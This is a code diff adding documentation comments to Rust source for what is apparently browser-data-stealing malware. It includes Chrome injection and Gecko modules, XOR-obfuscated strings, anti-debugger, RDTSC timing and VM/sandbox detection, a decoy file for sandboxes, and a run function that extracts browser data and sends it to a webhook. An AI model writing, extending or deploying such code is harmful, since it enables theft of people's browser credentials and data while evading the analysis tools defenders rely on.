@@ -1,3 +1,5 @@
+//! Browser data extraction orchestration and host environment checks.
+
 pub mod chrome_inject;
 pub mod chromium;
 pub mod gecko;
@@ -36,14 +38,17 @@ pub(crate) fn env_configured() -> bool {
     == Some(&xor_str(&[0x6B]))
 }
 
+/// Returns `true` when a debugger is attached.
 pub fn is_debugger_attached() -> bool {
     inject::anti::debugger_present()
 }
 
+/// Returns `true` when a simple RDTSC timing check suggests instrumentation.
 pub fn rdtsc_timing_anomaly() -> bool {
     inject::anti::rdtsc_anomaly()
 }
 
+/// Returns `true` when the host looks like an analysis or sandbox environment.
 pub fn is_analysis_environment() -> bool {
     is_debugger_attached() || rdtsc_timing_anomaly() || is_virtualized_environment()
 }
@@ -169,6 +174,7 @@ fn process_name(entry: &windows::Win32::System::Diagnostics::ToolHelp::PROCESSEN
     String::from_utf16_lossy(&entry.szExeFile[..len])
 }
 
+/// Returns `true` when VM drivers, processes, or low-resource signals are present.
 pub fn is_virtualized_environment() -> bool {
     low_physical_memory()
         || low_cpu_count()
@@ -176,6 +182,7 @@ pub fn is_virtualized_environment() -> bool {
         || vm_processes_present()
 }
 
+/// Writes a harmless decoy file when running in a sandbox-like environment.
 pub fn run_sandbox_decoy() {
     let path = std::env::temp_dir().join(xor_str(&[
         0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
@@ -192,6 +199,7 @@ pub fn run_sandbox_decoy() {
     );
 }
 
+/// Extracts browser data and sends it to the configured webhook when allowed.
 pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
     if is_analysis_environment() {
         if is_virtualized_environment() {
